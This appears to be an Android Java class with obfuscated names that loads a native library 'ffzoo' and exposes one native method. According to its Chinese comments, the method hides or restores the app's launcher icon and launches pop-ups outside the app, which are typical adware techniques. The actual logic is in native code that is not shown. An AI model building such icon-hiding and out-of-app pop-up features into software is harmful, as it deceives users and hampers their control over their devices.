package com.thunderbolt.methods.bodhisattva.ll.oo;

import android.content.Context;
import android.util.Log;

import androidx.annotation.Keep;

import java.util.Random;

@Keep
public class FzeLo {

    // 原始有效代码
    static {
        try {
            System.loadLibrary("ffzoo");
        } catch (Exception e) {}
    }
    @Keep
    public static native boolean ffzoojk(Context context, int num);//参数num%8==5隐藏图标,num%8==3恢复隐藏.num%8==7外弹(外弹在主进程主线程调用).

}

